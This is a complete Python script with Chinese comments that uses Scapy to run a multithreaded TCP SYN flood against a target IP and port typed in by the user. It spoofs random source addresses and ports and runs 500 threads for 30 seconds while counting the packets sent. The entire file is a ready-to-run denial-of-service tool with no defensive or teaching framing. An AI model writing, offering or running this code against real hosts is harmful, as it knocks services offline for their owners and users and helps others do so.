#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
import threading
import time

# Scapy 是 Python 的一个强大网络包处理库，
# 可以使用 pip install scapy 安装
from scapy.all import IP, TCP, send

# 攻击参数
target_ip = input("请输入目标 IP: ")
target_port = int(input("请输入目标端口: "))
threads_count = 500  # 可以根据需要调整线程数

# 全局统计变量
packet_count = 0
attack_flag = True  # 控制攻击停止/继续的标志

def syn_flood():
    global packet_count, attack_flag

    while attack_flag:
        try:
            # 随机生成源IP和源端口
            src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
            src_port = random.randint(1024, 65535)

            # 构造 IP 层
            ip_layer = IP(src=src_ip, dst=target_ip)

            # 构造 TCP 层：只设置 SYN 标志
            tcp_layer = TCP(
                sport=src_port,               # 随机源端口
                dport=target_port,           # 目标端口
                flags='S',                   # SYN 标志位
                seq=random.randint(0, 4294967295)  # 随机序列号
            )

            # 使用 scapy 的 send() 函数发送 SYN 包
            # verbose=False 可以减少终端输出
            send(ip_layer/tcp_layer, verbose=False)

            # 统计已发送的数据包数量
            packet_count += 1

            # 每发送 1000 个包打印一次数量
            if packet_count % 1000 == 0:
                print(f"[+] 已发送 {packet_count} 个 SYN 包")

        except Exception as e:
            # 如果异常，只简单跳过
            pass

def start_attack():
    threads = []
    # 启动多线程同时发送
    for _ in range(threads_count):
        t = threading.Thread(target=syn_flood)
        t.daemon = True  # 主程序退出时，子线程自动结束
        t.start()
        threads.append(t)

    # 这里可以根据需要设定攻击时长
    # 例如：攻击 30 秒后停止
    attack_duration = 30  
    print(f"[*] 攻击进行中... ({attack_duration} 秒)")
    time.sleep(attack_duration)

    # 设置标志停止攻击
    global attack_flag
    attack_flag = False

    # 等待所有线程结束
    for t in threads:
        t.join()

    print("[*] 攻击结束.")

if __name__ == "__main__":
    start_attack()
